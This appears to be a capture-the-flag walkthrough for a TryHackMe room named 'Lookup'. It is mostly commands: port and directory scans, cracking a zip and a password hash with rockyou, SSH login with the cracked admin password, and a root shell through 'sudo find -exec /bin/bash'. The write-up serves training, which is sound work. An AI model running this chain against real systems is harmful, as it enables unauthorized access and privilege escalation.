
# TryHackMe - Lookup Walkthrough

**Target IP**: `10.10.56.153`  
**Room**: [Lookup](https://tryhackme.com/room/lookup)

---

## 1. Reconnaissance

### Nmap Scan

Begin with an Nmap scan to find open ports and services:

```bash
nmap -sC -sV -Pn 10.10.56.153
```

**Findings**:
- **Port 22** – OpenSSH 7.2p2
- **Port 80** – Apache httpd 2.4.18

---

## 2. Exploring the Web Server

Visiting `http://10.10.56.153` in the browser shows a basic webpage with limited content.

### Directory Bruteforce

Run a directory scan to uncover hidden files or directories:

```bash
gobuster dir -u http://10.10.56.153 -w /usr/share/wordlists/dirb/common.txt
```

**Discovered**: `/robots.txt`  
Inside it: `AdminArea` and `backups`

### Navigating to `/backups`

We find a file named `backup.zip`. Download it:

```bash
wget http://10.10.56.153/backups/backup.zip
```

---

## 3. Investigating the Backup

The zip is password-protected. Use `fcrackzip` to brute-force:

```bash
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
```

Password found: `magicword`

Unzip it:

```bash
unzip backup.zip
```

The extracted file is `backup.sql`.

---

## 4. Analyzing the SQL File

Open `backup.sql`. It contains database info, including what looks like a hashed password and username (`admin:hash`).

Use an online hash identifier or `hash-identifier` to confirm the hash type (e.g., MD5/SHA1).

Try cracking it with:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashfile
```

Recovered password: `qwerty789`

---

## 5. SSH Access

Using the credentials:

```bash
ssh admin@10.10.56.153
Password: qwerty789
```

We're in as `admin`.

---

## 6. Privilege Escalation

Check sudo privileges:

```bash
sudo -l
```

We can run `/usr/bin/find` as root.

Use this to escalate:

```bash
sudo find . -exec /bin/bash \; -quit
```

You now have root access.

---

## 7. Flags

- **User flag**: Found in `/home/admin/user.txt`
- **Root flag**: Located in `/root/root.txt`

---

## Summary

This room emphasizes web enumeration, zip cracking, and Linux privilege escalation via `find`. A great beginner-level CTF that teaches essential pentesting skills.

---

✅ *Completed by [YourName]*  
🗂️ Path: `/tryhackme/lookup.md`
